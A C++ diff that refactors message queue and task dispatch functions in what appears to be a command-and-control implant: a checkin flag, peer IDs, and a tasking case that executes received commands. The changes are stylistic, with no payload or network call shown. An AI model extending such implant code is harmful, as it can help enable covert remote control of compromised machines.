@@ -29,14 +29,13 @@ namespace Dispatcher {
     VOID RemoveMessage(const _stream *target) {
         HEXANE
 
-        _stream *head = Ctx->transport.outbound_queue;
         _stream *prev = { };
 
-        if (!head || !target) {
+        if (!Ctx->transport.outbound_queue || !target) {
             return;
         }
 
-        while (head) {
+        for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
             if (head == target) {
                 if (prev) {
                     prev->next = head->next;
@@ -51,23 +50,22 @@ namespace Dispatcher {
             }
 
             prev = head;
-            head = head->next;
         }
     }
 
-    VOID MessageQueue(_stream *const out) {
+    VOID MessageQueue(_stream *const msg) {
         HEXANE
 
         _parser parser = { };
         _stream *queue = { };
 
-        x_assert(out);
+        x_assert(msg);
 
-        if (out->length > MESSAGE_MAX) {
-            QueueSegments(B_PTR(out->buffer), out->length);
+        if (msg->length > MESSAGE_MAX) {
+            QueueSegments(B_PTR(msg->buffer), msg->length);
 
         } else {
-            Parser::CreateParser(&parser, B_PTR(out->buffer), out->length);
+            Parser::CreateParser(&parser, B_PTR(msg->buffer), msg->length);
 
             queue            = Stream::CreateStream();
             queue->peer_id   = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
@@ -81,7 +79,7 @@ namespace Dispatcher {
             AddMessage(queue);
 
             Parser::DestroyParser(&parser);
-            Stream::DestroyStream(out);
+            Stream::DestroyStream(msg);
         }
 
         defer:
@@ -215,7 +213,6 @@ namespace Dispatcher {
         Parser::CreateParser(&parser, B_PTR(in->buffer), in->length);
         Parser::UnpackDword(&parser);
 
-        auto success = true;
         auto task_id = Parser::UnpackDword(&parser);
 
         x_memcpy(&Ctx->session.current_taskid, &task_id, sizeof(uint32_t));
@@ -223,7 +220,7 @@ namespace Dispatcher {
 
         switch (Parser::UnpackDword(&parser)) {
             case TypeCheckin:
-                x_memcpy(&Ctx->session.checkin, &success, sizeof(bool));
+                x_memset(&Ctx->session.checkin, true, sizeof(bool));
                 break;
             case TypeTasking:
                 Memory::Execute::ExecuteCommand(parser);
